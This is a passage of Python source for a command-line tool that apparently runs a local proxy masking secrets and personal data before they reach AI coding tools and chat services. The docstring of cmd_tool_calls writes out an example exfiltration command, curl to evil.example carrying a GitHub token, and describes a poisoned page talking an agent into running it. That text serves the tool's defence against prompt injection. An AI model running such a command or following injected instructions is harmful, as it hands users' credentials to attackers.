"""``omna`` command line.

    omna start [-d] [--port N] [--smart]   run the proxy (foreground, or -d in the background)
    omna stop                              stop the background proxy
    omna ensure                            start the background proxy if it is not running (used by the Claude Code hook)
    omna status                            is it running, what is wired, what was caught today
    omna log [-n 20] [--verify]            the local receipts (counts only, never values)
    omna mask [TEXT|-] [--smart]           mask a piece of text and print it
    omna style [tokens|realistic]          how a masked value is WRITTEN: a numbered token
                                            (the default, everywhere) or a realistic fake value
                                            (your browser only — see `omna style`)
    omna smart [on|off]                    smart masking (names and addresses written in sentences); on by default
    omna categories [on|off NAME...]       what Omna masks; switch a category off or back on (secrets: always masked)
    omna allow VALUE                       never mask this exact value again (false positive)
    omna mask-always VALUE [--label NAME]  always mask this value, e.g. a client's name
    omna forget                            wipe the token registry (tokens will renumber)
    omna crash [--show N|--send|--always|--never]  what broke here; masked on disk, sent only if you said yes
    omna verify-model                      check the on-device model against its pinned hash
    omna report [--days 7] [--json|--html F] weekly summary from the receipts
    omna init [--project] [--no-system]    wire Claude Code (settings.json env + SessionStart hook);
                                            on a Mac, also trust the certificate + set the system proxy
    omna uninstall [--project]             undo init (Claude Code + Mac system proxy/certificate)
    omna menubar                           a status icon: on/off, what's covered, Uninstall (auto-starts on a Mac)
    omna tools                             show tool policy (on/off)
    omna enable TOOL / omna disable TOOL   turn a tool on/off (claude-code, aider, codex also wire/unwire it)
    omna apps                              show app policy (mask/bypass)
    omna bypass app NAME                   never mask this app's traffic (still receipted)
    omna mask app NAME                     mask this app's traffic (the default)
    omna capture app NAME                  Stage 3: deep-capture an app that ignores the system proxy
    omna hosts [add|remove HOST]           show/add/remove the hostnames counted as AI
    omna version
"""

from __future__ import annotations

import argparse
import json
import os
import re
import contextlib
import fcntl
import shutil
import secrets
import signal
import subprocess
import sys
import time
from datetime import date
from pathlib import Path

import httpx

from . import aider, claude_code, codex, config, continue_dev, crashlog, extension_auth, pause, receipts
from .policy import Policy
from .style import STYLES


def _health(port: int) -> dict | None:
    try:
        r = httpx.get(f"{config.base_url(port)}/omna/health", timeout=1.0, trust_env=False)
        if r.status_code == 200:
            return r.json()
    except httpx.HTTPError:
        pass
    return None


def _who_answers(port: int) -> str:
    """"omna" when the curl command answers on ``port`` and proves it holds
    this machine's secret, "stranger" when something else answers there,
    "nobody" when nothing does (finding 6: `omna ensure` used to accept any
    program that answered /omna/health as Omna)."""
    token = extension_auth.ensure_token()   # no secret yet = nothing could prove it: make one first
    nonce = secrets.token_hex(16)
    try:
        r = httpx.get(f"{config.base_url(port)}/omna/health", params={"nonce": nonce}, timeout=1.0, trust_env=False)
    except httpx.HTTPError:
        return "nobody"
    if r.status_code != 200:
        return "stranger"
    try:
        got = r.json().get("proof")
    except (ValueError, AttributeError):
        return "stranger"
    return "omna" if isinstance(got, str) and secrets.compare_digest(got, extension_auth.proof(token, nonce)) else "stranger"


def _stranger_message(port: int) -> str:
    return (f"omna: something that is NOT Omna is answering on port {port} — it did not prove it holds "
            f"this machine's secret. Nothing was sent to it. Find it with `lsof -nP -iTCP:{port} -sTCP:LISTEN`. "
            f"Just updated Omna? The old version may still be running: `omna stop`, then `omna start -d`.")


def _pair_chrome(quiet: bool = False) -> None:
    """Register Omna for Chrome's trusted channel (finding 6). Chrome reads it
    only at start-up, so a first registration needs one Chrome restart."""
    try:
        written = extension_auth.register()
    except OSError as e:
        if not quiet:
            print(f"omna: WARNING — could not register Omna for Chrome's channel ({e}); smart masking in Chrome stays off")
        return
    if written and not quiet:
        print("omna: Omna for Chrome can now prove it is talking to Omna — quit and reopen Chrome once to pick this up")



@contextlib.contextmanager
def _start_lock(seconds: float = 90.0):
    """#42: only one process at a time may decide "nothing answers, start a
    copy" — `omna start -d`, `omna ensure` (every Claude Code window, the
    menu bar). Without it two of them spawned at once and omna.pid named a
    copy that died. A file lock: released by the OS even if we are killed."""
    config.ensure_home()
    f = open(config.home() / "start.lock", "a")
    end = time.monotonic() + seconds
    try:
        while True:
            try:
                fcntl.flock(f.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
                break
            except BlockingIOError:
                if time.monotonic() > end:
                    break                     # never hang a client for good; go on as before
                time.sleep(0.1)
        yield
    finally:
        try:
            fcntl.flock(f.fileno(), fcntl.LOCK_UN)
        finally:
            f.close()


def _spawn(port: int, smart: bool, no_restore_secrets: bool = False) -> int:
    config.ensure_home()
    log = open(config.log_path(), "ab")
    cmd = config.self_command() + ["start", "--port", str(port)] + (["--smart"] if smart else []) + (["--no-restore-secrets"] if no_restore_secrets else [])
    p = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=log, stderr=log, start_new_session=True, close_fds=True)
    config.pid_path().write_text(str(p.pid))
    return p.pid


def _wait_healthy(port: int, seconds: float) -> dict | None:
    deadline = time.time() + seconds
    while time.time() < deadline:
        h = _health(port)
        if h:
            return h
        time.sleep(0.2)
    return None


def _wait_exited(pid: int, seconds: float) -> bool:
    """True once process ``pid`` is gone (its ports are free again)."""
    end = time.monotonic() + seconds
    while True:
        try:
            os.kill(pid, 0)
        except ProcessLookupError:
            return True
        except PermissionError:
            return True                     # the number now belongs to someone else's process
        if time.monotonic() >= end:
            return False
        time.sleep(0.2)


RESTART_NOTE_MAX_SECONDS = 120


def _restart_is_mine() -> bool:
    """True when the restart note names this process's parent: this copy WAS
    started by the restart helper, so it is the restart's own new copy and
    must not wait for that restart (checker 2026-11-21: it did, and the helper
    waited for it — Omna stayed down about a minute after every change)."""
    try:
        return int(config.restart_lock_path().read_text().strip() or 0) == os.getppid()
    except (OSError, ValueError):
        return False


def _restart_in_progress() -> bool:
    """#33b: is another `omna` command restarting the service right now? While
    it is, `omna ensure` and `omna start` must not start a copy of their own:
    the old copy is closing and the new one is not answering yet, so the
    service looks down — but a second copy would leave omna.pid naming a dead
    process. A note left by a restart that died, or is over two minutes old,
    does not count and is removed."""
    p = config.restart_lock_path()
    try:
        who = int(p.read_text().strip() or 0)
        age = time.time() - p.stat().st_mtime
    except (OSError, ValueError):
        return False
    alive = False
    if who and age < RESTART_NOTE_MAX_SECONDS:
        try:
            os.kill(who, 0)
            alive = True
        except ProcessLookupError:
            alive = False
        except PermissionError:
            alive = True
    if not alive:
        p.unlink(missing_ok=True)
    return alive


def _restart_daemon(a=None, smart: bool | None = None) -> None:
    """Called after every policy save. Real behavior (never exercised by a test,
    which always monkeypatches this by name — see the safety rule): if the Mac
    launchd job is installed, kick it; else if a background (`-d`) proxy is
    tracked by a pidfile, stop it and re-spawn it detached with the SAME
    smart it was already running with and the SAVED secrets setting; else — including a
    foreground instance that answers health checks but owns no pidfile, which
    this process cannot safely restart from the outside — do nothing but say so."""
    from .mac import launchd

    if launchd.plist_path().exists():
        launchd.restart()
        return
    port = getattr(a, "port", None) or config.DEFAULT_PORT
    p = config.pid_path()
    if not p.exists():
        if _health(port):
            print(f"omna: a proxy is running in the foreground on {config.base_url(port)}; restart it yourself to apply the new policy")
        return
    h = _health(port) or {}
    if smart is None:
        smart = bool(h.get("smart", False))
    # The saved setting, never the dying daemon's answer: when it does not
    # answer, "restore" used to be assumed (lead L1).
    no_restore_secrets = not Policy.load().restore_secrets
    _hand_off_restart(port, smart, no_restore_secrets)


def _restart_here(port: int, smart: bool, no_restore_secrets: bool) -> None:
    """Do the restart's steps in THIS process, under the restart note. Used by
    the helper (`omna restart-worker`), and as the fallback when no helper
    could be started."""
    lock = config.restart_lock_path()
    config.ensure_home()
    lock.write_text(str(os.getpid()))
    try:
        # #42: the same lock `start -d` and `ensure` take, so none of them can
        # slip into the gap between "old copy stopped" and "new copy answering".
        with _start_lock():
            _replace_running_copy(config.pid_path(), port, smart, no_restore_secrets)
    finally:
        try:
            if lock.read_text().strip() == str(os.getpid()):
                lock.unlink()
        except OSError:
            pass


def _hand_off_restart(port: int, smart: bool, no_restore_secrets: bool) -> None:
    """#34b: hand the restart to a separate helper process and wait for it.

    Owner, 2026-11-21: the chat was interrupted while `omna privacy-filter off`
    was restarting the service in this process — the old copy had been stopped,
    the new one was never started, and the Mac lost its AI traffic. The helper
    runs in its own session (no terminal, its own process group), so Ctrl-C or
    a cut chat kills only this command; the helper still finishes the restart.
    The restart note names the helper, so `omna ensure` waits for it."""
    config.ensure_home()
    cmd = (config.self_command() + ["restart-worker", "--port", str(port)]
           + (["--no-restore-secrets"] if no_restore_secrets else []) + (["--smart"] if smart else []))
    try:
        log = open(config.log_path(), "ab")
        helper = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=log, stderr=log,
                                  start_new_session=True, close_fds=True)
    except OSError:
        _restart_here(port, smart, no_restore_secrets)
        return
    config.restart_lock_path().write_text(str(helper.pid))
    try:
        helper.wait(timeout=RESTART_NOTE_MAX_SECONDS)
    except subprocess.TimeoutExpired:
        pass
    # Never stop the helper here, even when this command is being killed: it
    # is the only thing that brings the service back.
    if not _wait_healthy(port, 5):
        print(f"omna: policy saved, but the proxy did not come back up; see {config.log_path()}", file=sys.stderr)


def cmd_restart_worker(a) -> int:
    """`omna restart-worker` — internal: the helper started by a restart (#34b)."""
    _restart_here(a.port, bool(a.smart), bool(a.no_restore_secrets))
    return 0


def _replace_running_copy(p, port: int, smart: bool, no_restore_secrets: bool) -> None:
    """Stop the copy named in omna.pid, wait until it has exited, start a new
    one and wait for it to answer. Runs under the restart note (#33b)."""
    try:
        old = int(p.read_text().strip() or 0)
        if old:
            os.kill(old, signal.SIGTERM)
    except (ProcessLookupError, ValueError):
        old = 0
    # omna.pid keeps naming the old copy until it has exited (#33b): deleted
    # earlier, `omna ensure` saw "not running" and started a second copy.
    # Wait until the old copy has really exited before starting the new one.
    # Started too early, the new copy sees the old one still answering, says
    # "already running" and quits — then the old one finishes closing and
    # nothing runs (owner, 2026-11-21: Claude Code lost its connection after
    # `omna privacy-filter off`). A copy that will not close is force-stopped.
    if old and not _wait_exited(old, 30):
        try:
            os.kill(old, signal.SIGKILL)
        except ProcessLookupError:
            pass
        _wait_exited(old, 5)
    p.unlink(missing_ok=True)
    _spawn(port, smart, no_restore_secrets)
    if not _wait_healthy(port, 60 if smart else 10):
        print(f"omna: policy saved, but the proxy did not come back up; see {config.log_path()}", file=sys.stderr)


def _save_policy(pol: Policy, a=None) -> None:
    pol.save()
    _restart_daemon(a)
    print("omna: policy saved; restarting → omna restart")


def _smart_wanted(a) -> bool:
    """`--smart` forces it on for this run; otherwise the saved setting decides."""
    return bool(getattr(a, "smart", False)) or Policy.load().smart == "on"


def _no_restore_secrets_wanted(a) -> bool:
    """True when secrets must be redacted for good. `--no-restore-secrets` /
    `--restore-secrets` on `omna start` SAVE the choice (policy.json); every
    later start — `omna ensure`, the menu bar, the login job, a restart after
    a settings change — reads it from there (security review, lead L1)."""
    pol = Policy.load()
    want = pol.restore_secrets
    if getattr(a, "no_restore_secrets", False):
        want = False
    elif getattr(a, "restore_secrets", False):
        want = True
    if want != pol.restore_secrets:
        pol.restore_secrets = want
        pol.save()
        print("omna: saved — secrets are " + ("put back locally again" if want else
              "redacted for good from now on, also after a restart (undo: omna start --restore-secrets)"))
    return not want


def cmd_start(a) -> int:
    a.smart = _smart_wanted(a)
    a.no_restore_secrets = _no_restore_secrets_wanted(a)
    if not _restart_is_mine() and _restart_in_progress():   # #33b: let that restart finish, then look again
        print("omna: a restart is in progress; waiting for it to finish")
        end = time.monotonic() + 90
        while _restart_in_progress() and time.monotonic() < end:
            time.sleep(0.5)
    if a.daemon:
        with _start_lock():
            who = _who_answers(a.port)
            if who == "omna":
                print(f"omna: already running on {config.base_url(a.port)}")
                return 0
            if who == "stranger":
                print(_stranger_message(a.port), file=sys.stderr)
                return 1
            _pair_chrome()
            pid = _spawn(a.port, a.smart, a.no_restore_secrets)
            h = _wait_healthy(a.port, 60 if a.smart else 10)
        if h:
            pause.end("start")      # protection is back: written down with how long it was off
            print(f"omna: running in the background on {config.base_url(a.port)} (pid {pid}, engine {h['engine']})")
            return 0
        print(f"omna: failed to start; see {config.log_path()}", file=sys.stderr)
        return 1
    who = _who_answers(a.port)
    if who == "omna":
        print(f"omna: already running on {config.base_url(a.port)}")
        return 0
    if who == "stranger":
        print(_stranger_message(a.port), file=sys.stderr)
        return 1
    _pair_chrome()
    from . import daemon

    pause.end("start")
    daemon.run(api_port=a.port, smart=a.smart, restore_secrets=not a.no_restore_secrets)
    return 0


def write_claude_env_file() -> None:
    """Claude Code itself goes through the Mac-wide door (claude_code.py), but
    the commands it runs for the person — curl, git, npm, pip, their own
    scripts — must not: they broke whenever Omna was paused, and Python
    scripts to AI hosts failed the certificate check (checker finding
    2026-11-21). Claude Code runs the file named in CLAUDE_ENV_FILE before
    each Bash command; the SessionStart hook writes the undo there. Only our
    own proxy address is undone; anyone else's is left alone."""
    path = os.environ.get("CLAUDE_ENV_FILE")
    if not path or os.environ.get("HTTPS_PROXY") != claude_code._door_url():
        return
    try:
        with open(path, "a") as f:
            f.write("unset HTTPS_PROXY\n" + ("unset https_proxy\n" if os.environ.get("https_proxy") in (None, claude_code._door_url()) else ""))
    except OSError:
        pass


def cmd_ensure(a) -> int:
    # Used by the Claude Code SessionStart hook: must be quiet on success
    # (anything printed becomes context for the model).
    write_claude_env_file()
    if sys.platform == "darwin":
        # #37: an update that moved Omna to another Python leaves the menu-bar
        # app pointing at a deleted folder; it would never start again.
        from .mac import app_bundle

        app_bundle.repair_if_stale(**app_bundle.own_python())
    if _restart_in_progress():          # #33b: the restart brings it back; a copy of ours would be a second one
        return 0
    with _start_lock():
        who = _who_answers(a.port)
        if who == "omna":
            return 0
        if who == "stranger":
            print(_stranger_message(a.port), file=sys.stderr)
            return 1
        _pair_chrome(quiet=True)
        _spawn(a.port, _smart_wanted(a), _no_restore_secrets_wanted(a))
        healthy = _wait_healthy(a.port, 10)
    if not healthy:
        return 1
    pause.end("start")
    return 0


def cmd_stop(a) -> int:
    p = config.pid_path()
    if not p.exists():
        if _health(a.port):
            print("omna: a proxy is running but was not started by `omna start -d`; stop it where you started it")
            return 1
        print("omna: not running")
        return 0
    try:
        pid = int(p.read_text().strip() or 0)
    except ValueError:
        pid = 0
    try:
        if pid <= 0:                    # never os.kill(0, …): that signals our own process group
            raise ProcessLookupError
        os.kill(pid, 0)
        gone_already = False
    except ProcessLookupError:
        gone_already = True
    except PermissionError:
        gone_already = False
    if gone_already and _health(a.port):
        # #33b(b): omna.pid named a process that had already exited, and a
        # different copy is answering — saying "stopped" would be false.
        p.unlink(missing_ok=True)
        print(f"omna: a copy of Omna is still running on {config.base_url(a.port)}, but it is not the one omna.pid named, "
              f"so it was not stopped. Find it with `lsof -nP -iTCP:{a.port} -sTCP:LISTEN`")
        return 1
    # Written down BEFORE it goes off (finding 16). The menu bar's Pause has
    # already recorded itself (with its 15-minute end); this is a plain stop.
    pause.begin("stop")
    try:
        if pid > 0:
            os.kill(pid, signal.SIGTERM)
    except ProcessLookupError:
        pass
    p.unlink(missing_ok=True)
    print("omna: stopped — browsers and desktop apps now go to the AI UNMASKED; coding tools cannot connect. `omna start -d` to protect again")
    return 0


def _today_receipts() -> list[dict]:
    today = date.today().isoformat()
    return [r for r in receipts.tail(0) if str(r.get("ts", "")).startswith(today)]


def _today_counts() -> dict[str, int]:
    return receipts.summary(_today_receipts())


def _fmt_counts(c: dict[str, int]) -> str:
    return " ".join(f"{k}×{v}" for k, v in sorted(c.items())) or "-"


def _doors_line(h: dict | None) -> str:
    # Deliberately simple: on/off per door from /omna/health's `doors` dict.
    # A "(PAC on Wi-Fi)" style detail from mac.setup.status() was considered but
    # dropped — that reads real network state via `networksetup` on every
    # `omna status`, which is unnecessary work for a status line (see report).
    doors = (h or {}).get("doors") or {"api": False, "system": False, "deep": False}
    return "doors:        api {} · system {} · deep {}".format(
        *("on" if doors.get(k) else "off" for k in ("api", "system", "deep"))
    )


def _apps_today_line(pol: Policy, recs_today: list[dict]) -> str:
    counts: dict[str, int] = {}
    for r in recs_today:
        app = r.get("app")
        if app:
            counts[app] = counts.get(app, 0) + 1
    parts = []
    for app in sorted(counts):
        suffix = " (bypassed)" if pol.app_action(app) == "bypass" else ""
        parts.append(f"{app} ×{counts[app]}{suffix}")
    for app in sorted(pol.apps):
        if app not in counts:
            parts.append(f"{app} — not seen")
    return "apps today:   " + (" · ".join(parts) if parts else "none seen yet")


def _refused_line(recs_today: list[dict]) -> str:
    counts: dict[tuple[str, str], int] = {}
    for r in recs_today:
        if r.get("note") == "tls-refused":
            key = (r.get("app") or "unknown app", r.get("host") or "?")
            counts[key] = counts.get(key, 0) + 1
    if not counts:
        return "refused:      none today"
    parts = [f'{app} → {host} ×{n} (pinned)  → omna bypass app "{app}"' for (app, host), n in sorted(counts.items())]
    return "refused:      " + " · ".join(parts)


def _registry_line() -> str:
    """The one line that answers "where do my real values live, encrypted?".

    This is the first question a security-minded buyer asks, so it never hides
    behind a word like "exists" — it names the protection, or says plainly that
    there isn't any.
    """
    from .engine import registry_status

    r = registry_status()
    path, n, state = r["path"], r["entries"], r["at_rest"]
    if state == "empty":
        return f"registry:     {path} (empty — no values stored yet)"
    held = f"{n} value{'' if n == 1 else 's'}"
    if state == "encrypted":
        return f"registry:     {path} ({held}, encrypted — the key is in your macOS Keychain)"
    if state == "locked":
        return (f"registry:     {path} (encrypted, but the key is GONE from your Keychain — masking still\n"
                f"              works, tokens are renumbering, and nothing new is being saved."
                f"  → `omna forget` to start fresh)")
    soon = "  (the proxy will encrypt it the next time it starts)" if r["keychain"] else \
           "  (no macOS Keychain here, so file permissions are the only protection — turn FileVault on)"
    return f"registry:     {path} ({held}, NOT ENCRYPTED){soon}"


def _style_line(pol: Policy) -> str:
    """What a masked value looks like at each door — they can differ, and the
    difference is a safety rule, so `omna status` says so out loud."""
    from .style import style_for_door

    api = style_for_door("api", pol.style).style
    system = style_for_door("system", pol.style).style
    if api == system:
        return f"style:        {api} (every door)"
    return (f"style:        {system} in the browser, {api} for coding tools "
            f"(they write files, where a fake value would look real)")


SMART_ON_TEXT = ("Smart masking is on: Omna also catches names and addresses written in sentences. "
                 "Code only, no personal data? `omna smart off` saves a little memory and speed.")
SMART_OFF_TEXT = ("Smart masking is off: names, home addresses and birth dates written in sentences "
                  "go to the AI as they are. Turn it on: `omna smart on`.")


def _smart_word(h: dict) -> str:
    """"on" / "off" / "FAILED (fast only)" for the proxy line of `omna status`."""
    if not h.get("smart"):
        return "off"
    return "FAILED (fast only)" if h.get("smart_failed") and not h.get("smart_models") else "on"


def smart_message(on: bool, ready: list[str], failed: dict[str, str] | None = None) -> list[str]:
    """The two lines `omna status` shows about smart masking — the benefit, both
    ways — and the truth when a model did not download (Muse QA B4, 2026-11-17)."""
    if not on:
        return ["smart:        OFF", "              " + SMART_OFF_TEXT]
    failed = failed or {}
    why = "; ".join(f"{name}: {err}" for name, err in failed.items())
    if not ready and failed:
        return [f"smart:        FAILED — the smart model did not download ({why}); fast masking only (rules)",
                "              Names and addresses written in sentences go to the AI as they are. "
                "Retry: `omna stop && omna start -d`."]
    if not ready:
        return ["smart:        on, model still downloading (fast masking meanwhile)", "              " + SMART_ON_TEXT]
    line = f"smart:        on ({', '.join(ready)})"
    if failed:
        line += f" — {', '.join(failed)} failed to download ({why}); retry: `omna stop && omna start -d`"
    return [line, "              " + SMART_ON_TEXT]


def cmd_smart(a) -> int:
    """`omna smart [on|off]` — the saved smart-masking setting."""
    pol = Policy.load()
    if a.state is None:
        print(SMART_ON_TEXT if pol.smart == "on" else SMART_OFF_TEXT)
        return 0
    pol.smart = a.state
    pol.save()
    print(SMART_ON_TEXT if a.state == "on" else SMART_OFF_TEXT)
    if a.state == "on":
        from . import smart as smart_models

        names = " + ".join(smart_models.SHOWN_AS[m] for m in smart_models.models_here())
        print(f"omna: models for this machine: {names} (downloaded once, in the background)")
    _restart_daemon(a, smart=a.state == "on")
    return 0


PRIVACY_FILTER_OFF_TEXT = ("the OpenAI privacy-filter model is off: faster masking and less memory; "
                           "the compact model + fast rules still mask secrets and personal data. "
                           "Turn it on: `omna privacy-filter on`")
PRIVACY_FILTER_ON_TEXT = ("the OpenAI privacy-filter model is on: it also catches more names and addresses "
                          "written in sentences, but long pastes are slower and it needs ~2 GB more memory. "
                          "Turn it off: `omna privacy-filter off`")


def privacy_filter_line(pol: Policy) -> str:
    """The `omna status` line for the opt-in OpenAI privacy-filter model."""
    from . import smart as smart_models

    if pol.privacy_filter != "on":
        return "privacy filter: OFF — " + PRIVACY_FILTER_OFF_TEXT
    if not smart_models.full_model_fits():
        return (f"privacy filter: ON, but this Mac has under {smart_models.FULL_MODEL_MIN_RAM_GB} GB of memory, "
                "so it does not run here. Turn it off: `omna privacy-filter off`")
    return "privacy filter: ON — " + PRIVACY_FILTER_ON_TEXT


def cmd_privacy_filter(a) -> int:
    """`omna privacy-filter [on|off]` — the opt-in OpenAI privacy-filter model
    (off by default, owner 2026-11-22; kept, never deleted)."""
    pol = Policy.load()
    if a.state is None:
        print(privacy_filter_line(pol))
        return 0
    pol.privacy_filter = a.state
    pol.save()
    print(privacy_filter_line(pol))
    if a.state == "on" and pol.smart != "on":
        print("omna: smart masking is off, so no model runs until `omna smart on`")
    if a.state == "on":
        print("omna: its model (~809 MB) downloads once, in the background")
    _restart_daemon(a, smart=pol.smart == "on")
    return 0


def tool_calls_line(pol: Policy) -> str:
    """One line on what goes back into an agent's tool calls (finding 2)."""
    tc = pol.tool_calls
    sec = "put back" if tc.get("secrets") else "stay hidden"
    per = "put back" if tc.get("personal", True) else "stays hidden"
    return (f"tool calls:   secrets {sec}, personal data {per} in commands and files an agent writes"
            f" (text you read always gets both)  → `omna tool-calls`")


def cmd_tool_calls(a) -> int:
    """`omna tool-calls [secrets|personal] [on|off]` — what may be put back
    into an agent's tool calls: the commands it runs and the files it writes.

    A poisoned web page or file can talk the model into a command like
    `curl evil.example/?k=[SECRET_GITHUB_TOKEN_1]`; putting the real token
    back there hands it to a stranger. So secrets stay as stand-ins in tool
    calls unless you switch them on. Read live by the running proxy — no
    restart (a restart renumbers secrets)."""
    pol = Policy.load()
    if a.kind is None:
        print(tool_calls_line(pol))
        print("  secrets ON: a task that needs the real key in a command works — and so would a")
        print("  poisoned page that talks the model into sending your key somewhere.")
        return 0
    if a.state is None:
        print(f"omna: say on or off — `omna tool-calls {a.kind} on|off`", file=sys.stderr)
        return 2
    pol.tool_calls = {**pol.tool_calls, a.kind: a.state == "on"}
    pol.save()
    print(tool_calls_line(pol))
    if a.kind == "secrets" and a.state == "on":
        print("omna: WARNING — real secrets now go into commands and files an agent writes. "
              "`omna tool-calls secrets off` to undo.")
    return 0


# What a client may switch off. Secrets never: a leaked key is the worst case.
CATEGORIES = {
    "PERSON": "names", "EMAIL": "email addresses", "PHONE": "phone numbers",
    "ADDRESS": "home and street addresses, PIN/ZIP codes", "GOV_ID": "government IDs (SSN, Aadhaar, PAN, passport, licence, plates)",
    "FINANCIAL": "card, bank account, IBAN and UPI numbers", "HEALTH": "health IDs and codes",
    "EMPLOYMENT": "employee IDs, salaries", "DIGITAL": "IP and MAC addresses, device IDs, profile links",
    "BIRTH": "dates of birth",
}
ALIASES = {"NAME": "PERSON", "NAMES": "PERSON", "PEOPLE": "PERSON", "EMAILS": "EMAIL", "PHONES": "PHONE",
           "ADDRESSES": "ADDRESS", "IDS": "GOV_ID", "ID": "GOV_ID", "MONEY": "FINANCIAL", "BANK": "FINANCIAL",
           "WORK": "EMPLOYMENT", "DOB": "BIRTH", "IP": "DIGITAL"}


def _ruleset_data() -> dict:
    p = config.ruleset_path()
    if p.exists():
        try:
            return json.loads(p.read_text())
        except ValueError:
            pass
    from .engine import DEFAULT_ALLOWLIST

    return {"allowlist": list(DEFAULT_ALLOWLIST), "custom_rules": []}


def cmd_categories(a) -> int:
    """`omna categories` — list; `omna categories off PHONE …` / `on PHONE …`."""
    data = _ruleset_data()
    off = [c for c in data.get("mask_off", []) if c in CATEGORIES]
    if a.action:
        wanted = []
        for raw in a.names:
            key = raw.strip().upper()
            key = ALIASES.get(key, key)
            if key in ("SECRET", "SECRETS", "CREDENTIAL", "CREDENTIALS", "PASSWORD", "PASSWORDS", "KEYS", "API_KEY"):
                print("omna: secrets (API keys, passwords, tokens) are always masked — they cannot be switched off.",
                      file=sys.stderr)
                return 2
            if key not in CATEGORIES:
                print(f"omna: unknown category {raw!r}. Categories: {', '.join(CATEGORIES)}", file=sys.stderr)
                return 2
            wanted.append(key)
        if not wanted:
            print("omna: name at least one category, e.g. `omna categories off PHONE`", file=sys.stderr)
            return 2
        off = sorted(set(off) | set(wanted)) if a.action == "off" else [c for c in off if c not in wanted]
        data["mask_off"] = off
        from . import ruleset as ruleset_file

        ruleset_file.write(data)
        _restart_daemon(a)
    for key, what in CATEGORIES.items():
        print(f"{'OFF' if key in off else 'on ':<4} {key:<11} {what}")
    print("on   SECRETS     API keys, passwords, tokens — always masked")
    if off:
        print("\nomna: switched-off categories go to the AI as they are. `omna categories on NAME` to undo.")
    return 0


def _status_details(a) -> int:
    from .engine import engine_version
    from .proxy import __version__

    h = _health(a.port)
    print(f"omna plugin {__version__}  engine {engine_version()}")
    if h:
        speed = f", {h['avg_mask_ms_this_run']} ms average to mask" if h.get("avg_mask_ms_this_run") else ""
        print(f"proxy:        running on {config.base_url(a.port)}  (smart masking {_smart_word(h)}, secrets {'restored locally, never on disk' if h.get('restore_secrets', True) else 'redacted for good'}, {h['requests_this_run']} requests this run{speed})")
    else:
        print(pause.status_line() or "proxy:        NOT running — nothing is masked  → `omna start -d`")
    if h:
        for line in smart_message(bool(h.get("smart")), h.get("smart_models") or [], h.get("smart_failed") or {}):
            print(line)
        print(privacy_filter_line(Policy.load()))
    if h:
        from . import pdf as _pdf

        both = h.get("ocr") and _pdf.available()
        print("files:        text, code, Word, Excel, RTF, ODT masked; pictures and PDFs: "
              + ("values blacked out" if both else "go as they are (needs macOS)")
              + "; the receipt says which")
    from . import ruleset as ruleset_file

    for line in ruleset_file.status_lines():
        print(line)
    cc = claude_code.status(claude_code.settings_file("user"))
    wired = cc["wired"]
    print(f"claude code:  {'wired' if wired else 'not wired'} ({cc['file']}){'  hook ok' if cc['hook'] else ''}{'' if wired else '  → `omna init`'}")
    if h:
        last = h.get("extension_last_seen")
        if last and (time.time() - last) < 120:
            print(f"extension:    connected (v{h.get('extension_version') or '?'})")
        else:
            print("extension:    not connected yet  → already have Omna for Chrome? it connects within a minute (quit and reopen Chrome once after installing Omna); don't have it? chromewebstore.google.com/detail/omna/nnkjconloimokalfdghmhifcangdbmnc")
    if shutil.which("aider"):
        ast = aider.status()
        aw = ast["openai_base"] == f"{config.base_url(a.port)}/v1" or ast["anthropic_base"] == config.base_url(a.port)
        print(f"aider:        {'wired' if aw else 'not wired'}{'' if aw else '  → `omna enable aider`'}")
    if shutil.which("codex"):
        # Read the way Codex reads it (finding 8): our address at the top
        # level AND Codex on the built-in openai provider — not just "our
        # line is somewhere in the file".
        xst = codex.status(codex.settings_file())
        xw = xst["routed"] and xst["base_url"] == f"{config.base_url(a.port)}/v1"
        if xw:
            print("codex cli:    wired")
        elif xst["routed"]:
            print(f"codex cli:    NOT through omna — Codex points at {xst['base_url']}  → `omna enable codex`")
        elif xst["base_url"] and xst["provider"] != codex.BUILTIN_PROVIDER:
            print(f"codex cli:    NOT through omna — {xst['problem']}")
        else:
            print(f"codex cli:    not wired ({xst['problem']})  → `omna enable codex`")
    if continue_dev.detected():
        cst = continue_dev.status()
        print(f"continue:     {'wired' if cst['wired'] else 'not wired'}{'' if cst['wired'] else '  → `omna enable continue`'}")
    pol = Policy.load()
    if pol.org or pol.dept:
        print(f"enrolled:     {pol.org or '(no org)'} / {pol.dept or '(no department)'}  (device {pol.device_id})")
    ok, n, msg = receipts.verify()
    off_note = "  (OFF — nothing new is being logged)" if not pol.reports_enabled else ""
    total, bad = receipts.bad_receipts()
    print(f"receipts:     {total} total, {msg if ok else f'{len(bad)} don' + chr(39) + f't check out (first at {bad[0][0]}: {msg})'}; today: {_fmt_counts(_today_counts())}{off_note}")
    print(_style_line(pol))
    print(tool_calls_line(pol))
    reg = extension_auth.registered()
    print(f"chrome link:  {'registered for ' + str(len(reg)) + ' browser(s) — Omna for Chrome proves who it talks to' if reg else 'not registered → `omna init` (then quit and reopen Chrome once)'}")
    print(_registry_line())
    recs_today = _today_receipts()
    print(_doors_line(h))
    print(_apps_today_line(pol, recs_today))
    print(_refused_line(recs_today))
    print("what leaves this machine: the masked request, to the AI provider you were already using. Your content never reaches Omna.")
    return 0



# ---------------------------------------------------------------- omna status (#41)
# Owner 2026-11-22: "it should be easy to read, very user-friendly ... look
# like Apple, not Windows." One headline, one line per thing that is covered,
# today in plain words, the proof, and a fix next to anything that is off.
# Everything technical stays in `omna status --details`.

def _mac_apps_route() -> tuple[str, bool] | None:
    """(the network service carrying this Mac's internet, does it send AI
    traffic through Omna?) — None when that cannot be read (not a Mac)."""
    if sys.platform != "darwin":
        return None
    from .mac import netproxy

    try:
        dev = ""
        r = subprocess.run(["route", "-n", "get", "default"], capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            if line.strip().startswith("interface:"):
                dev = line.split(":", 1)[1].strip()
        order = subprocess.run(["networksetup", "-listnetworkserviceorder"], capture_output=True, text=True, timeout=5).stdout
    except (OSError, subprocess.SubprocessError):
        return None
    service = ""
    last = ""
    for line in order.splitlines():
        line = line.strip()
        if line.startswith("(") and ")" in line and "Hardware Port" not in line:
            last = line.split(")", 1)[1].strip().lstrip("*").strip()
        elif "Hardware Port" in line and dev and f"Device: {dev})" in line:
            service = last
    if not service:
        return None
    try:
        url, enabled = netproxy.current_pac(service)
    except (OSError, subprocess.SubprocessError):
        return None
    return service, bool(enabled and "/omna/proxy.pac" in url)


def _when(ts: str) -> str:
    from datetime import datetime

    try:
